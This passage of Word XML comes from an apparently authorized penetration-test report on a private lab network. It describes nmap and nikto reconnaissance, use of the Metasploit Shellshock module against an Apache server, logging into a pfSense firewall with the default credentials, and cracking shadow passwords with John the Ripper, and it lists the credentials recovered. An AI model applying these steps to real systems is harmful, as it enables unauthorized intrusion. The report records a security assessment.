    <w:p w14:paraId="6015E86A" w14:textId="38EAE343" w:rsidR="008657D8" w:rsidRPr="00521489" w:rsidRDefault="001A3F86" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3367C911" wp14:editId="246E5CCD">
            <wp:extent cx="3512185" cy="1925955"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="19570403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2185" cy="1925955"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E71B68" w14:textId="63A556EB" w:rsidR="00F91DC0" w:rsidRPr="00521489" w:rsidRDefault="00F91DC0" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. PC</w:t>
      </w:r>
      <w:r w:rsidR="000B61E7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nmap scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A87927" w14:textId="564CA79E" w:rsidR="00F91DC0" w:rsidRPr="00521489" w:rsidRDefault="00622C49" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C254D95" wp14:editId="3E7CD6E3">
            <wp:extent cx="2729230" cy="955675"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="10348454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9230" cy="955675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="571B519B" w14:textId="18A6F687" w:rsidR="00622C49" w:rsidRPr="00521489" w:rsidRDefault="00622C49" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. PC</w:t>
      </w:r>
      <w:r w:rsidR="000B61E7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> mounting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FC03B5" w14:textId="3DBFB80B" w:rsidR="00622C49" w:rsidRPr="00521489" w:rsidRDefault="00CC29DB" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="282F95ED" wp14:editId="125E1105">
            <wp:extent cx="5908675" cy="803275"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="423414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8675" cy="803275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C6E619" w14:textId="05B272DE" w:rsidR="00CC29DB" w:rsidRPr="00521489" w:rsidRDefault="00CC29DB" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. PC</w:t>
      </w:r>
      <w:r w:rsidR="000B61E7" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> authorized keys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C152DE6" w14:textId="41CB1C10" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="00426AC2" w:rsidP="00426AC2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Moreover, the show IP route discover</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a possible Firewall on the 192.168.0.240 IP.  Running</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> another</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> nmap scan for the OS on this IP reveal</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it </w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s Linux based, running an Apache httpd 2.4.10 Unix web server. The application nikto </w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s used to banner grab the firewall, reveal</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> its permissions and further confirm</w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the information about the OS and software found in the nmap scan. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739EE678" w14:textId="2F4CFC69" w:rsidR="00CC29DB" w:rsidRPr="00521489" w:rsidRDefault="002A6652" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30BB355B" wp14:editId="0E3C0308">
            <wp:extent cx="5188585" cy="1870075"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="17484550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8585" cy="1870075"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE3783E" w14:textId="538E85F7" w:rsidR="002A6652" w:rsidRPr="00521489" w:rsidRDefault="002A6652" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Firewall nmap scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043D4399" w14:textId="4FCEB236" w:rsidR="002A6652" w:rsidRPr="00521489" w:rsidRDefault="009B1576" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B9F21BC" wp14:editId="3C88310E">
            <wp:extent cx="5819140" cy="2826385"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="15010162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9140" cy="2826385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="215884F7" w14:textId="7067B13E" w:rsidR="009B1576" w:rsidRPr="00521489" w:rsidRDefault="009B1576" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. nikto scan on webserver 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED5EE29" w14:textId="2F116640" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="00685309" w:rsidP="00426AC2">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">With the </w:t>
      </w:r>
      <w:r w:rsidR="006E1D2D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">webpage properly identified, Metasploit </w:t>
      </w:r>
      <w:r w:rsidR="00EA6C48" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="006E1D2D" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s used to exploit the apache server and port forward. </w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The nikto scan reveal</w:t>
      </w:r>
      <w:r w:rsidR="00EA6C48" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that there </w:t>
      </w:r>
      <w:r w:rsidR="00EA6C48" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a /cgi-bin/ subfolder on the Apache server, and due to these two facts the exploit /apache_mod_cgi_bash_env_exec/ </w:t>
      </w:r>
      <w:r w:rsidR="00EA6C48" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> utilized.  The port forwarding process can be found below in Figure </w:t>
      </w:r>
      <w:r w:rsidR="00F46317" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>30 and</w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> navigating to localhost:5000 reveal</w:t>
      </w:r>
      <w:r w:rsidR="00EA6C48" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="009A0E94" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a Pfsense firewall server login.  Pfsense has default login credentials set to admin/pfsense, and inputting this gave the tester access to the firewalls as seen in Figure 31. These IP addresses are as follows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AF7D7C" w14:textId="12169146" w:rsidR="00426AC2" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WAN – 192.168.0.234</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B386EB6" w14:textId="7B60B414" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>LAN – 192.168.0.98</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B985E48" w14:textId="45ED9989" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DMZ – 192.168.0.241</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17227442" w14:textId="19B8A1B2" w:rsidR="009B1576" w:rsidRPr="00521489" w:rsidRDefault="00C544CA" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7454DD3B" wp14:editId="77E7FBED">
            <wp:extent cx="5943600" cy="6137275"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="7142175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137275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7108F906" w14:textId="44986B69" w:rsidR="00C544CA" w:rsidRPr="00521489" w:rsidRDefault="00C544CA" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Metasploit execution on webserver 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773CDBBE" w14:textId="034ADDC1" w:rsidR="00C544CA" w:rsidRPr="00521489" w:rsidRDefault="00C544CA" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A1AD913" wp14:editId="1B93770D">
            <wp:extent cx="5777230" cy="2043430"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="8461599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7230" cy="2043430"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6747FDF2" w14:textId="6A40FA82" w:rsidR="00C544CA" w:rsidRPr="00521489" w:rsidRDefault="00C544CA" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 3</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Metasploit execution on webserver 2 part 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585ADDAA" w14:textId="77777777" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="009A0E94">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20FD63CC" wp14:editId="55A6E500">
            <wp:extent cx="5943600" cy="3560445"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="182009927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99275" name="Picture 41"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30F6976E" w14:textId="77777777" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="009A0E94">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F1C142D" w14:textId="341E427F" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="009A0E94">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 3</w:t>
      </w:r>
      <w:r w:rsidR="00702C62" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. localhost 5000 successful login from webserver 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0DF824" w14:textId="46DBED1B" w:rsidR="009A0E94" w:rsidRPr="00521489" w:rsidRDefault="009A0E94" w:rsidP="009A0E94">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>After logging in successfully to the firewall, the tester once again utiliz</w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> shadow and John the Ripper </w:t>
      </w:r>
      <w:r w:rsidR="00BA2AF0" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> password crack any logins on the webserver.   These </w:t>
      </w:r>
      <w:r w:rsidR="007C4186" w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> first downloaded from the Metasploit framework and then ran to reveal two new logins, root/apple and xweb/pears.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C99EAF3" w14:textId="733EEB8B" w:rsidR="00C544CA" w:rsidRPr="00521489" w:rsidRDefault="005F6038" w:rsidP="003464B3">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07D5A826" wp14:editId="4F79C080">
            <wp:extent cx="5936615" cy="3491230"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:docPr id="633793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3491230"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
